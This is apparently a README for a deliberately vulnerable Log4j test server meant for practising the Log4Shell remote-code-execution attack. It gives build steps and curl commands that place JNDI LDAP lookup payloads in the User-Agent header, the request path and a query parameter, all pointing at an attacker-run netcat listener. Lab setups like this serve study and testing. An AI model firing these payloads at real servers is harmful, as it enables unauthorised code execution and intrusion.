# log4jpwn

log4j rce test environment

see: <https://www.lunasec.io/docs/blog/log4j-zero-day/>

![](images/image.png)

## build

Either build the jar on your host with `mvn clean compile assembly:single`

Or use `docker` to build an image with `docker build -t log4jpwn .`

## run

The server will log 3 things:

- The `User-Agent` header content
- The request path
- The `pwn` query string parameter

To use:

- Run the container with `docker run --rm -p8080:8080 log4jpwn` (or the jar if you built on your host with `java -jar target/log4jpwn-1.0-SNAPSHOT-jar-with-dependencies.jar`)
- Make a `curl` request with a poisoned `User-Agent` header with your payload. eg `curl -H 'User-Agent: ${jndi:ldap://172.16.182.1:8081/a}' localhost:8080`, where 172.16.182.1 is where my netcat lister is running.

A complete example for all 3 bits that gets logged:

```bash
curl -v -H 'User-Agent: ${jndi:ldap://192.168.0.1:443/a}' 'localhost:8080/${jndi:ldap://192.168.0.1:443/a}/?pwn=$\{jndi:ldap://192.168.0.1:443/a\}'
```
